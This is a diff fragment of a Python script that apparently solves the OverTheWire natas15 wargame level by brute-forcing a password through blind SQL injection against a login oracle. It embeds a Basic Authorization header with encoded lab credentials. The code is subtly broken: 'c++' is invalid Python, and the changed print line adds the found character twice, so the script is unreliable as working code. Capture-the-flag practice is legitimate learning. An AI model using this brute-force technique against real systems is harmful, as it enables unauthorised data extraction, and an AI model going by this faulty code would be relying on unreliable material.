@@ -12,5 +12,5 @@ while c<32:
 		req=requests.post('http://natas15.natas.labs.overthewire.org/index.php',data=dat,auth=auth,headers={"Authorization":"Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="})
 		if "This user exists" in str(req.content):
 			pw=pw+i
-			print("\b" + i)
+			print(pw + i)
 			c++
